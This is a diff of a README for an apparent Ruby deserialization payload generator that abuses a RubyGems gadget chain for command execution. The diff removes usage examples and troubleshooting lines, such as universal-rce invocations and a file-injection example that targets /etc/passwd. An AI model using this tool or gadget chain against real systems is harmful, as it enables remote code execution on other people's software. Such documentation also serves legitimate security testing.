@@ -29,7 +29,6 @@ This tool generates Ruby Marshal deserialization payloads that exploit RubyGems 
 
 ## Requirements
 
-- Ruby 2.x or 3.x
 - RubyGems (included with Ruby)
 - Standard libraries: `optparse`, `base64`, `yaml`
 
@@ -151,43 +150,6 @@ Gem::RequestSet → Net::WriteAdapter → Kernel.system
 
 *Required based on selected technique
 
-## Examples
-
-### File Operations (Legacy/Testing)
-
-```bash
-# File path injection
-./ruby_deser.rb -t file-injection -p "/tmp/test.txt" -e base64
-
-# YAML payload for file injection
-./ruby_deser.rb -t file-injection -p "/etc/passwd" -y -e base64
-```
-
-### Reliable RCE (Modern Ruby)
-
-```bash
-# Command execution with Universal RCE
-./ruby_deser.rb -t universal-rce -c "id" -e hex -o payload
-
-# Save payload and test
-./ruby_deser.rb -t universal-rce -c "whoami" -e all -o exploit
-
-# Base64 encoded payload
-./ruby_deser.rb -t universal-rce -c "rm /tmp/test" -e base64
-```
-
-### Output Formats
-
-```bash
-# Hex only
-./ruby_deser.rb -t universal-rce -c "id" -e hex
-
-# Base64 only
-./ruby_deser.rb -t universal-rce -c "id" -e base64
-
-# All formats
-./ruby_deser.rb -t universal-rce -c "id" -e all
-```
 
 ## Technical Details
 
@@ -209,28 +171,6 @@ Technique 3 works by:
 
 This bypasses path sanitization and directly executes system commands, making it reliable across Ruby versions.
 
-## Troubleshooting
-
-### Error: "Technique is required"
-
-Specify a technique:
-```bash
-./ruby_deser.rb -t universal-rce -c "id"
-```
-
-### Error: "Path is required for file-injection"
-
-Provide a path:
-```bash
-./ruby_deser.rb -t file-injection -p "/tmp/test.txt"
-```
-
-### Error: "Command is required"
-
-Provide a command:
-```bash
-./ruby_deser.rb -t universal-rce -c "your command"
-```
 
 ### Payload Not Executing on Target
 
